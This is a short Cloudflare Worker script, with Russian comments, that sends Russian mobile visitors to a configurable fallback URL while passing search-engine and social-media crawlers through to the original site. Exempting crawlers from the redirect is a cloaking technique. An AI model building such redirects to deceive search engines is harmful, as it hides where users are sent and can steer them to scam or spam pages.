// worker.js  ───── минимальный редирект RU-мобилок

const BOT_UA = /\b(googlebot|bingbot|yandex(bot|images)|duckduckbot|baiduspider|slurp|mail\.ru_bot|applebot|facebookexternalhit|twitterbot|discordbot|telegrambot)\b/i;
const MOBILE_UA = /\b(android|iphone|ipod|windows phone|opera mini|opera mobi|blackberry|bb10|silk\/|kindle|webos|iemobile)\b/i;

/**
 * Handler for Cloudflare Workers to redirect RU mobile traffic.
 *
 * @param {Request} request Incoming request object
 * @param {Record<string, string>} env Environment bindings
 * @returns {Promise<Response>}
 */
export async function redirectRuMobile(request, env) {
    const url = new URL(request.url);

    /* 1. страна: RU */
    const country = (request.cf?.country || request.headers.get('CF-IPCountry') || '').toUpperCase();
    if (country !== 'RU') return fetch(request);

    /* 2. боты к origin */
    const ua = request.headers.get('User-Agent') || '';
    if (BOT_UA.test(ua)) return fetch(request);

    /* 3. мобильность */
    const chMobile = request.headers.get('Sec-CH-UA-Mobile');
    const isMobile = (chMobile === '?1')
      || (chMobile !== '?0' && MOBILE_UA.test(ua) && !/iPad/i.test(ua));

    if (!isMobile) return fetch(request);

    /* 4. пропуск статики (по желанию) */
    if (/\.(css|js|png|jpe?g|gif|webp|svg|ico|woff2?|ttf)$/i.test(url.pathname))
      return fetch(request);

    /* 5. редирект */
    const fb = env.FALLBACK_URL;                         // задаётся в UI
    if (!fb) return new Response('FALLBACK_URL missing', { status: 503 });

    const rUrl = new URL(fb);
    if (!rUrl.searchParams.has('_ruredir')) rUrl.searchParams.set('_ruredir', '1');

    return new Response('Redirect\n', {
      status: 302,
      headers: {
        Location: rUrl.toString(),
        'Cache-Control': 'public, max-age=300',
        'Content-Type': 'text/plain; charset=utf-8',
        Connection: 'close',
        'X-Edge-Redirect': 'ru-mobile'
      }
    });
}

export default {
  fetch: redirectRuMobile
};
